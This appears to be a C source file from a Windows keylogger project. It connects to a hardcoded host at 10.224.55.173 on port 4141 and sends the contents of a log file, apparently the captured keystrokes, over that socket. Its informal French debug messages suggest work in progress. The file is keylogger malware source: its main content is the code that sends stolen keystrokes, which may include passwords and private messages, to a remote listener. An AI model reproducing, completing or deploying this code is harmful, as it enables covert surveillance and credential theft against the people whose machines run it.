#include "keylogger.h"

SOCKET	init_socket(SOCKET my_sock)
{
	struct addrinfo *ptr, *result, hints;
	u_long io = 1;

	SecureZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	if (getaddrinfo("10.224.55.173", "4141", &hints, &ptr) != 0)
	{
		printf("getaddrinfo failed\n");
		return (my_sock);
	}
	for (result = ptr; result != NULL; result = result->ai_next)
	{
		if ((my_sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol)) == INVALID_SOCKET)
		{
			printf("socket failed\n");
			return (my_sock);
		}
		if (connect(my_sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
		{
			Sleep(2000);
			if (shutdown(my_sock, SD_BOTH) == SOCKET_ERROR)
			{
				printf("failed shutdown\n");
				closesocket(my_sock);
				return (my_sock);
			}
			closesocket(my_sock);
			my_sock = INVALID_SOCKET;
			continue;
		}
		break;
	}
	freeaddrinfo(result);
	if ((ioctlsocket(my_sock, FIONBIO, &io)) != NO_ERROR)
		WSAGetLastError();
	return (my_sock);
}

void	send_data(SOCKET my_sock, FILE *fd)
{
	printf("je suis au tout debut du send data\n");
	char buf[BUFFSIZE];
	int i;

	i = 0;
	SecureZeroMemory(buf, BUFFSIZE);
	if (my_sock == INVALID_SOCKET)
		return;
	//fflush(fd);
	if ((fseek(fd, 0, SEEK_SET)) == -1)
		return;
	printf("je suis apres le fflush mais ca m'etonnerait\n");
	while ((i = _read(_fileno(fd), buf, BUFFSIZE)) > 0)
	{
		printf("je suis la fonction qui marche pas coucou\n");
		printf("%d\n", i);
		if (send(my_sock, buf, i, 0) == SOCKET_ERROR)
		{
			printf("failed send\n");
			Sleep(2000);
			closesocket(my_sock);
			my_sock = INVALID_SOCKET;
			return;
		}
		printf("%s\n", buf); 
		SecureZeroMemory(buf, BUFFSIZE);
	}

	printf("je suis juste avant le recv\n");
	while (recv(my_sock, buf, BUFFSIZE, 0) > 0)
	{
		printf("coucou je suis dans le recv\n");
		SecureZeroMemory(buf, BUFFSIZE);
	}
}